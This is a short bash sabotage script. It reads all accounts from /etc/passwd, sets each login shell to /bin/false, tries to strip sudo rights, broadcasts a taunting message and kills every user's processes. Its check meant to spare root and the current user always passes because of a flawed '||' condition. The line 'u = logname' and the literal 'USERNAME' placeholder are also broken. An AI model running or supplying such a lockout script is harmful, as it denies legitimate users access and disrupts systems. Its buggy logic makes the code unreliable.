#!/bin/bash
u = logname 
echo $u
awk -F: '{ print $1}' /etc/passwd > users.txt
while read p; do
	if [[ "$p" != "$u" ]] || [[ "$p" != "root" ]]; then
		chsh -s /bin/false $p
		deluser USERNAME sudo
		wall "Ooof, thats gotta hurt. Seeya!"
		pkill -KILL -u $p
	else
		echo "didn't kick important user $p"
	fi
done < users.txt
